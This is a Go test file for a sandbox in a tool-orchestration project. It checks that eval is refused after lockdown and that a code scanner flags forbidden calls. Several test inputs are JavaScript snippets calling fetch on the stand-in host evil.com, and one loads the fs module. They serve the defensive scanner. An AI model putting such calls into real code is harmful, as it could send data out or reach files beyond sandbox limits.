// Copyright 2026 Dunkel Cloud GmbH
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package composite

import (
	"context"
	"strings"
	"testing"

	"github.com/DunkelCloud/ToolMesh/internal/dadl"
)

// TestSandbox_LockdownRuntimeRuns exercises the LockdownRuntime code path
// including the AsyncFunction / GeneratorFunction try/catch blocks (H-11).
// It verifies that after lockdown, eval and Function are explicitly refused.
func TestSandbox_LockdownRuntimeRuns(t *testing.T) {
	comp := dadl.CompositeDef{
		Description: "lockdown",
		Code:        `try { eval("1"); return "no error"; } catch (e) { return "caught"; }`,
		Timeout:     "5s",
	}
	r, err := Execute(context.Background(), &comp, "test", nil, mockExecutor(nil), nil)
	if err != nil {
		t.Fatal(err)
	}
	if r.Value != "caught" {
		t.Errorf("expected eval to throw, got %v", r.Value)
	}
}

// TestScanCode_ClassWithForbiddenIdentifier ensures the scanner walks class
// bodies (walkClassBody) and reports violations inside methods / fields /
// static blocks.
func TestScanCode_ClassWithForbiddenIdentifier(t *testing.T) {
	code := `
		class Foo extends Object {
			constructor() {
				super();
				const x = fetch("http://evil.com");
			}
		}
	`
	violations, err := ScanCode(code, "test")
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, v := range violations {
		if strings.Contains(v.Message, "fetch") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected fetch violation inside class body, got %v", violations)
	}
}

func TestScanCode_ClassStaticBlock(t *testing.T) {
	code := `
		class Foo {
			static {
				const data = require("fs");
			}
		}
	`
	violations, err := ScanCode(code, "test")
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, v := range violations {
		if strings.Contains(v.Message, "require") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected require violation inside static block, got %v", violations)
	}
}

func TestScanCode_ClassFieldDefinition(t *testing.T) {
	code := `
		class Foo {
			bad = fetch("http://evil.com");
		}
	`
	violations, err := ScanCode(code, "test")
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, v := range violations {
		if strings.Contains(v.Message, "fetch") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected violation in class field initializer, got %v", violations)
	}
}

func TestScanCode_TaggedTemplateLiteral(t *testing.T) {
	// Tag references a forbidden identifier — must be flagged (H-12).
	code := "const x = fetch`http://evil.com/${foo}`;"
	violations, err := ScanCode(code, "test")
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, v := range violations {
		if strings.Contains(v.Message, "fetch") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected fetch violation in tagged template, got %v", violations)
	}
}

func TestScanCode_ExtendedStatements(t *testing.T) {
	// Exercise many walkStatement / walkExpression branches in one pass.
	code := `
		let sum = 0;
		for (let i = 0; i < 3; i++) { sum += i; }
		for (const k in {a:1}) { sum += 1; }
		for (const v of [1,2,3]) { sum += v; }
		let j = 0;
		while (j < 2) { j++; }
		do { j--; } while (j > 0);
		switch (sum) { case 3: break; default: break; }
		try { throw new Error("x"); } catch (e) { sum = 0; } finally { sum = 1; }
		const obj = { a: 1, b, ...other };
		const arr = [1, 2, ...other];
		const cond = sum > 0 ? 1 : 2;
		const unary = -sum;
		const seq = (1, 2, 3);
		const opt = obj?.a;
		function named() { return 1; }
		const arrow1 = x => x * 2;
		const arrow2 = x => { return x * 2; };
	`
	_, err := ScanCode(code, "test")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
}
